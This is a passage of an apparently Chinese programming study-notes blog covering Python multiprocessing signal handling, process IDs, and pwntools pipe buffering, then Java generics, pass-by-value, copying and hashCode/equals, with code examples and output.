punctuation">.</span>Pool<span class="token punctuation">(</span>processes<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> maxtasksperchild<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> tqdm<span class="token punctuation">.</span>tqdm<span class="token punctuation">(</span>p<span class="token punctuation">.</span>imap_unordered<span class="token punctuation">(</span>worker<span class="token punctuation">,</span> t_args<span class="token punctuation">)</span><span class="token punctuation">,</span> total<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>t_args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token comment"># p.imap_unordered(sing, t_args)</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>输出</strong></p><p>可以观察到，子进程的 <code>try/catch</code>语句并没有打印相应的报错信息。但是信号处理函数中的打印语句是打印出来的。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">18667712  0%|                                                                                                        | 0/30 [00:00&lt;?, ?it/s]0唱11唱13唱12唱1 pid:  186678Process 186678 received signal 15Process 186678 exiting: Terminated4唱16唱17唱18唱19唱1 pid:  18668712唱1Process 186687 received signal 15Process 186687 exiting: Terminated11唱113唱1 pid:  186688Process 186688 received signal 15Process 186688 exiting: Terminated14唱116唱118唱117唱119唱121唱1 pid:  18668624唱1Process 186686 received signal 15Process 186686 exiting: Terminated23唱122唱126唱127唱1 pid:  186682Process 186682 received signal 1528唱1Process 186682 exiting: Terminated29唱1100%|█████████████████████████████████████████████████████████████████████████████████████████████| 30/30 [00:00&lt;00:00, 3469.43it/s]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>分析</strong></p><p>在代码中，当子进程接收到 <code>SIGTERM</code> 信号时，信号处理函数 <code>handle_signal</code> 会立即执行，通常会中断当前正在进行的操作。这意味着信号处理函数的执行优先级是高于 <code>try</code>/<code>catch</code> 块中的代码的。所以当 <code>handle_signal</code>引发异常以后，子进程中 <code>try/catch</code>语句中的报错是无法打印出来的。</p><h5 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h5><h5 id="1-进程id-pid、父进程id-ppid，进程组id-pgid之间的关系"><a href="#1-进程id-pid、父进程id-ppid，进程组id-pgid之间的关系" class="headerlink" title="1. 进程id pid、父进程id ppid，进程组id pgid之间的关系"></a>1. 进程id pid、父进程id ppid，进程组id pgid之间的关系</h5><ol><li>进程ID (PID)：</li></ol><ul><li>每个进程在创建时会被分配一个唯一的进程ID。</li></ul><ol start="2"><li>父进程ID (PPID)：</li></ol><ul><li>每个进程都有一个父进程，父进程的进程ID称为父进程ID (PPID)。</li></ul><ol start="3"><li>进程组ID (PGID)：</li></ol><ul><li>默认情况下，进程组ID等于创建它的父进程的进程ID。即使一个进程创建了新的进程，这些新进程将继承父进程的进程组ID。</li><li>进程组允许将多个相关的进程组织在一起，通常由第一个创建进程的PID作为PGID。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> multiprocessing<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pid <span class="token operator">=</span> os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span>    ppid <span class="token operator">=</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span>    pgid <span class="token operator">=</span> os<span class="token punctuation">.</span>getpgid<span class="token punctuation">(</span>pid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Process ID (PID): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pid<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Parent Process ID (PPID): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ppid<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Process Group ID (PGID): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pgid<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># 创建一个新的进程</span>    p <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 主进程的信息</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Main Process ID (PID): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Main Process Group ID (PGID): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>getpgid<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Main Process ID <span class="token punctuation">(</span>PID<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">178045</span>Main Process Group ID <span class="token punctuation">(</span>PGID<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">178045</span>Process ID <span class="token punctuation">(</span>PID<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">178046</span>Parent Process ID <span class="token punctuation">(</span>PPID<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">178045</span>Process Group ID <span class="token punctuation">(</span>PGID<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">178045</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中：</p><ul><li>主进程的PID是 178045，并且它的PGID也是 178045。</li><li>当主进程创建了一个新的子进程时，子进程的PID变成了 178046。</li><li>子进程的PPID是创建它的主进程的PID，即 178045。</li><li>默认情况下，子进程继承了父进程的PGID，所以子进程的PGID仍然是 178045。</li></ul><h5 id="2-os-kill发送信号"><a href="#2-os-kill发送信号" class="headerlink" title="2. os.kill发送信号"></a>2. os.kill发送信号</h5><p>使用 <code>os.kill</code> 函数向某个进程发送信号，实际上是由操作系统的内核负责产生信号并将其发送到指定进程。调用 <code>os.kill</code> 向进程发送信号时，如果进程注册了信号处理函数，该函数会优先执行。如果处理函数未终止进程，默认的信号处理行为将不会执行，进程会继续运行。这确保了用户可以通过信号处理函数实现自定义行为，而不是立即终止进程或触发其他默认行为。</p><h6 id="信号的产生和发送过程"><a href="#信号的产生和发送过程" class="headerlink" title="信号的产生和发送过程"></a>信号的产生和发送过程</h6><ol><li><strong>调用 <code>os.kill</code> 函数</strong>：<ul><li>当你在代码中调用 <code>os.kill(pid, signal.SIGTERM)</code> 时，Python 会将这个请求传递给操作系统的内核。这里，<code>pid</code> 是目标进程的进程ID，<code>signal.SIGTERM</code> 是要发送的信号。</li></ul></li><li><strong>内核处理信号请求</strong>：<ul><li>操作系统的内核接收到 <code>os.kill</code> 的请求后，会验证请求的合法性，包括检查发送信号的进程是否有权限向目标进程发送该信号。</li><li>如果请求合法，内核会产生对应的信号。</li></ul></li><li><strong>信号的传递</strong>：<ul><li>内核将生成的信号传递给目标进程。信号是一种异步通知机制，可以中断进程的正常执行，并引发预定义的信号处理程序。</li></ul></li><li><strong>信号的处理</strong>：<ul><li>目标进程接收到信号后，如果注册了相应的信号处理程序（如使用 <code>signal.signal(signal.SIGTERM, handle_signal)</code> 注册的处理函数），处理程序会被调用。</li><li>如果没有注册处理程序，默认的信号处理行为将被执行。对于 <code>SIGTERM</code>，默认行为是终止进程。</li></ul></li></ol><h5 id="3-信号处理函数、try-except-语句和系统默认行为的优先级关系"><a href="#3-信号处理函数、try-except-语句和系统默认行为的优先级关系" class="headerlink" title="3. 信号处理函数、try/except 语句和系统默认行为的优先级关系"></a>3. 信号处理函数、<code>try</code>/<code>except</code> 语句和系统默认行为的优先级关系</h5><p><strong>信号处理函数</strong>：</p><ul><li>当进程接收到信号时，如果该信号有用户定义的处理函数，操作系统会立即调用这个处理函数。</li><li>信号处理函数的调用是异步的，可以中断进程正在执行的任何代码，包括 <code>try</code> 块中的代码。</li><li>信号处理函数具有最高优先级，因为它可以在任何时候中断进程的执行。</li></ul><p><strong><code>try</code>/<code>except</code> 语句</strong>：</p><ul><li><code>try</code>/<code>except</code> 块用于捕获和处理异常。在信号处理函数中引发的异常可以被 <code>try</code>/<code>except</code> 块捕获。</li><li>当信号处理函数引发异常时，这个异常会中断当前代码的执行，并跳转到最近的 <code>try</code>/<code>except</code> 块。</li><li><code>try</code>/<code>except</code> 块的优先级低于信号处理函数，但高于默认信号处理行为。</li></ul><p><strong>系统默认行为</strong>：</p><ul><li>如果进程没有定义信号处理函数，或者信号处理函数没有引发异常，操作系统会执行该信号的默认处理行为。</li><li>默认处理行为的优先级最低，只有在没有用户定义的信号处理函数或信号处理函数没有覆盖默认行为时才会执行。</li></ul><h5 id="4-为什么try-except语句引发的异常，进程池无法接受到？"><a href="#4-为什么try-except语句引发的异常，进程池无法接受到？" class="headerlink" title="4. 为什么try/except语句引发的异常，进程池无法接受到？"></a>4. 为什么try/except语句引发的异常，进程池无法接受到？</h5><p>让我们深入探讨为什么进程池可以正确处理通过信号处理函数引发的 <code>SystemExit</code> 异常，但通过 <code>try</code>/<code>except</code> 语句引发的 <code>SystemExit</code> 异常却不能正确处理。</p><h4 id="3-信号处理函数和-try-except-语句的差异"><a href="#3-信号处理函数和-try-except-语句的差异" class="headerlink" title="3. 信号处理函数和 try/except 语句的差异"></a>3. 信号处理函数和 <code>try</code>/<code>except</code> 语句的差异</h4><ol><li><strong>信号处理函数的行为</strong>：<ul><li>当一个进程接收到信号（如 <code>SIGTERM</code>）时，操作系统会立即调用相应的信号处理函数。这中断了当前进程的执行，并处理信号。</li><li>在信号处理函数中引发 <code>SystemExit</code> 异常，会立即导致进程退出，并且操作系统会通知父进程（即进程池）该子进程已终止。</li><li>这种行为是操作系统级别的处理，确保了父进程能够捕获到子进程的终止状态。</li></ul></li><li><strong><code>try</code>/<code>except</code> 语句的行为</strong>：<ul><li><code>try</code>/<code>except</code> 语句是在用户代码层面进行异常处理。当在 <code>except</code> 块中引发 <code>SystemExit</code> 异常时，Python 解释器会认为这是一个正常退出过程。</li><li>但在某些情况下，尤其是在多进程环境下，这种由用户代码引发的 <code>SystemExit</code> 可能不会被进程池正确感知到。这可能与 Python 多进程模块内部的异常传播机制有关。</li></ul></li></ol><h4 id="4-pwntool，在不使用p-recvall-的情况下，p-poll-轮询将无法获得进程的退出码"><a href="#4-pwntool，在不使用p-recvall-的情况下，p-poll-轮询将无法获得进程的退出码" class="headerlink" title="4.  pwntool，在不使用p.recvall()的情况下，p.poll()轮询将无法获得进程的退出码"></a>4.  pwntool，在不使用p.recvall()的情况下，p.poll()轮询将无法获得进程的退出码</h4><p>在你的代码中，<code>p.poll()</code> 用于轮询进程的退出状态，<code>p.recvall()</code> 则是用来从进程的标准输出中读取数据。当你调用 <code>p.poll()</code> 时，它检查进程是否已经终止，并返回进程的退出码。如果进程还在运行，它返回 <code>None</code>。</p><h5 id="现象："><a href="#现象：" class="headerlink" title="现象："></a>现象：</h5><p>如果你不调用 <code>p.recvall()</code> 或其他类似的读取操作，进程可能不会像预期一样结束。这背后的原因与 <strong>缓冲区</strong> 和 <strong>管道</strong> 的工作原理有关。</p><h5 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h5><p>当你启动 <code>process</code> 时，标准输出（stdout）和标准输入（stdin）通常会通过管道进行通信。这些管道有一个固定的缓冲区。如果缓冲区满了而没有被读取，那么进程可能会阻塞，等待缓冲区被清空。这意味着如果你没有调用 <code>p.recvall()</code> 或其他读取方法来读取输出数据，进程可能会因为缓冲区满了而一直处于等待状态，从而无法结束。</p><p>具体的工作流程是这样的：</p><ol><li>你在进程中执行了 <code>sendline(shellcode)</code>，将 shellcode 发送给目标进程。</li><li>目标进程可能会产生一些输出，比如标准输出或错误输出，写入到它的管道中。</li><li>如果你没有读取这些输出，管道的缓冲区会逐渐填满。</li><li>一旦管道缓冲区满了，目标进程在试图向输出流中写入更多数据时会被阻塞，导致进程不能正常结束。</li><li>在这种情况下，<code>p.poll()</code> 将无法返回一个有效的退出码，因为目标进程仍在等待缓冲区被读取。</li></ol><h5 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h5><p>为了避免这种情况，你需要确保从进程的标准输出或错误输出中读取数据，以防止缓冲区阻塞进程的正常退出。调用 <code>p.recvall()</code> 可以读取进程的所有输出，并且在进程终止后，读取过程会自动结束。</p><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><h4 id="1-为什么java不能实现真正意义上的泛型？类似于C-的模板。"><a href="#1-为什么java不能实现真正意义上的泛型？类似于C-的模板。" class="headerlink" title="1. 为什么java不能实现真正意义上的泛型？类似于C++的模板。"></a>1. 为什么java不能实现真正意义上的泛型？类似于C++的模板。</h4><p>为了说明为什么 Java 如果采用类似 C++ 的模板机制就不能实现向后兼容性，我们可以通过以下例子来进行解释。</p><h5 id="向后兼容性"><a href="#向后兼容性" class="headerlink" title="向后兼容性"></a>向后兼容性</h5><p>Java 的设计理念之一是<strong>向后兼容性</strong>，即新版本的 Java 能够运行老版本编写的程序。这意味着即便 Java 引入了泛型特性，已经存在的老代码（未使用泛型）也应该能够继续运行。</p><h5 id="C-模板和-Java-泛型的区别"><a href="#C-模板和-Java-泛型的区别" class="headerlink" title="C++ 模板和 Java 泛型的区别"></a>C++ 模板和 Java 泛型的区别</h5><ul><li><strong>C++ 模板</strong>：在编译期生成针对每种类型的独立代码。编译器会为每个模板实例生成不同的函数或类。</li><li><strong>Java 泛型</strong>：通过<strong>类型擦除</strong>来实现泛型，确保在运行时只有一套字节码。</li></ul><h5 id="例子：C-模板如何导致向后不兼容"><a href="#例子：C-模板如何导致向后不兼容" class="headerlink" title="例子：C++ 模板如何导致向后不兼容"></a>例子：C++ 模板如何导致向后不兼容</h5><p>假设我们在 C++ 中有如下模板代码：</p><h5 id="C-模板例子"><a href="#C-模板例子" class="headerlink" title="C++ 模板例子"></a>C++ 模板例子</h5><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">Box</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    T value<span class="token punctuation">;</span>    <span class="token function">Box</span><span class="token punctuation">(</span>T val<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">value</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Box contains: "</span> <span class="token operator">&lt;&lt;</span> value <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">displayOld</span><span class="token punctuation">(</span>Box<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> box<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Old version: Box contains: "</span> <span class="token operator">&lt;&lt;</span> box<span class="token punctuation">.</span>value <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Box<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">intBox</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    intBox<span class="token punctuation">.</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Box contains: 123</span>        <span class="token function">displayOld</span><span class="token punctuation">(</span>intBox<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Old version works fine</span>    Box<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>string<span class="token operator">></span> <span class="token function">strBox</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    strBox<span class="token punctuation">.</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Box contains: Hello</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，<code>Box&lt;int&gt;</code> 和 <code>Box&lt;std::string&gt;</code> 是两个完全不同的类，编译器为 <code>int</code> 和 <code>std::string</code> 生成了两个不同的类实例。如果我们将现有的程序扩展为使用 <code>Box&lt;std::string&gt;</code>，之前编译的函数 <code>displayOld</code>（仅处理 <code>Box&lt;int&gt;</code>）将无法处理 <code>Box&lt;std::string&gt;</code>，因为它们是不同的类型。这在向后兼容性上就会出现问题：<strong>新增的模板类型与老版本生成的代码无法协作</strong>。</p><h5 id="Java-泛型向后兼容的方式"><a href="#Java-泛型向后兼容的方式" class="headerlink" title="Java 泛型向后兼容的方式"></a>Java 泛型向后兼容的方式</h5><p>为了避免这种问题，Java 采用了<strong>类型擦除</strong>机制，使得泛型类在编译时只生成一套字节码，这样老代码（没有泛型）依然可以与泛型代码协同工作。</p><h5 id="Java-泛型例子"><a href="#Java-泛型例子" class="headerlink" title="Java 泛型例子"></a>Java 泛型例子</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> strList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        strList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">displayOld</span><span class="token punctuation">(</span>strList<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 老代码仍然可以工作</span>                <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> intList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        intList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">displayOld</span><span class="token punctuation">(</span>intList<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 仍然兼容老代码</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 老版本的函数，不使用泛型</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">displayOld</span><span class="token punctuation">(</span><span class="token class-name">ArrayList</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Old version: "</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>类型擦除</strong>后，<code>ArrayList&lt;String&gt;</code> 和 <code>ArrayList&lt;Integer&gt;</code> 在运行时实际上是同一个类，即 <code>ArrayList&lt;Object&gt;</code>。因此，旧版的 <code>displayOld</code> 方法仍然可以处理新版本中传入的泛型参数，无论是 <code>ArrayList&lt;String&gt;</code> 还是 <code>ArrayList&lt;Integer&gt;</code>，因为它们都被视为 <code>ArrayList&lt;Object&gt;</code>。</p><h5 id="为什么-C-模板无法做到向后兼容"><a href="#为什么-C-模板无法做到向后兼容" class="headerlink" title="为什么 C++ 模板无法做到向后兼容"></a>为什么 C++ 模板无法做到向后兼容</h5><ol><li><strong>独立的类实例</strong>：C++ 模板在编译时为每个不同类型生成独立的代码。如果老代码只知道如何处理 <code>Box&lt;int&gt;</code>，它就无法处理 <code>Box&lt;std::string&gt;</code>，因为在编译时，这些是完全不同的类。</li><li><strong>模板代码膨胀</strong>：由于 C++ 为每个类型实例生成不同的代码，二进制文件大小会膨胀。而如果在新版本中引入了更多类型的实例，旧版本的代码和新版本的模板实例可能无法共存。</li><li><strong>无法统一处理所有类型</strong>：由于 C++ 模板为每种类型生成独立代码，旧的二进制代码无法处理新的类型实例。这就导致如果添加了新类型支持，必须重新编译所有代码。</li></ol><h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><p>如果 Java 采用了 C++ 模板机制，那么：</p><ul><li>老代码和新代码将无法互操作，因为编译期会为每个泛型实例生成独立的代码，老版本的代码不会知道如何处理新版本的泛型类。</li><li>为了让旧代码处理新的泛型类型，必须重新编译旧代码，这会导致向后兼容性问题。</li></ul><p>通过<strong>类型擦除</strong>，Java 确保了泛型的类型信息在编译时检查，运行时类型被擦除，使得编译后的字节码对所有泛型类型都一样，从而保证了新旧代码的兼容性。</p><h4 id="2-java-到底是值传递还是引用传递"><a href="#2-java-到底是值传递还是引用传递" class="headerlink" title="2. java 到底是值传递还是引用传递"></a>2. java 到底是值传递还是引用传递</h4><ul><li>值传递：当一个参数按照值的方式在两个方法之间传递时，调用者和被调用者其实是用的两个不同的变量——被调用者中的变量（原始值）是调用者中变量的一份拷贝，对它们当中的任何一个变量修改都不会影响到另外一个变量，<ul><li>Java 中的参数传递是按值传递的。</li><li>如果参数是基本类型，传递的是基本类型的字面量值的拷贝。</li><li>如果参数是引用类型，传递的是引用的对象在堆中地址的拷贝。</li></ul></li><li>引用传递： 当一个参数按照引用传递的方式在两个方法之间传递时，调用者和被调用者其实用的是同一个变量，当该变量被修改时，双方都是可见的。</li></ul><p><a href="https://javabetter.cn/basic-extra-meal/pass-by-value.html">https://javabetter.cn/basic-extra-meal/pass-by-value.html</a></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">ReferenceTypeDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"二哥"</span><span class="token punctuation">;</span>        <span class="token function">modify</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">modify</span><span class="token punctuation">(</span><span class="token class-name">String</span> name1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        name1 <span class="token operator">=</span> <span class="token string">"三妹"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240916120935.png" alt="20240916120935" style="zoom:50%;" /><h4 id="3-java-深拷贝和浅拷贝"><a href="#3-java-深拷贝和浅拷贝" class="headerlink" title="3. java 深拷贝和浅拷贝"></a>3. java 深拷贝和浅拷贝</h4><p>“深拷贝和浅拷贝不同的，深拷贝中的引用类型字段也会克隆一份，当改变任何一个对象，另外一个对象不会随之改变。”浅拷贝不会拷贝引用类型字段，引用类型的变量还是指向的同一个对象。</p><h4 id="4-hashCode-与-equals（为什么重写equals方法后，hashCode方法也必须重写"><a href="#4-hashCode-与-equals（为什么重写equals方法后，hashCode方法也必须重写" class="headerlink" title="4. hashCode 与 equals（为什么重写equals方法后，hashCode方法也必须重写)"></a>4. hashCode 与 equals（为什么重写equals方法后，hashCode方法也必须重写)</h4><p>在Java中，<code>hashCode()</code>和<code>equals()</code>方法有着密切的关系，特别是在使用哈希集合类（如<code>HashSet</code>、<code>HashMap</code>等）时。如果只重写了<code>equals()</code>方法，而不重写<code>hashCode()</code>，可能会导致程序行为不符合预期。</p><p><code>Object</code>类的<code>hashCode()</code>方法的默认实现是基于<strong>对象的内存地址</strong>来计算哈希值。这意味着每个对象的内存地址不同，因此它们的哈希值通常是不同的。</p><h5 id="equals-和hashCode-的作用："><a href="#equals-和hashCode-的作用：" class="headerlink" title="equals()和hashCode()的作用："></a><code>equals()</code>和<code>hashCode()</code>的作用：</h5><ol><li><strong><code>equals()</code><strong>：用来比较两个对象是否”相等”。默认情况下，<code>equals()</code>方法比较的是对象的</strong>引用</strong>（地址），但通常我们会根据对象的<strong>属性</strong>来判断两个对象是否相等，所以需要重写<code>equals()</code>方法。</li><li><strong><code>hashCode()</code><strong>：返回一个对象的</strong>哈希码</strong>，它是对象的一个整数表示，主要用于哈希表中的<strong>快速查找</strong>。在默认实现中，<code>hashCode()</code>方法基于对象的内存地址生成。</li></ol><h5 id="为什么重写equals-方法后，必须重写hashCode-方法？"><a href="#为什么重写equals-方法后，必须重写hashCode-方法？" class="headerlink" title="为什么重写equals()方法后，必须重写hashCode()方法？"></a>为什么重写<code>equals()</code>方法后，必须重写<code>hashCode()</code>方法？</h5><h5 id="Java的基本约定："><a href="#Java的基本约定：" class="headerlink" 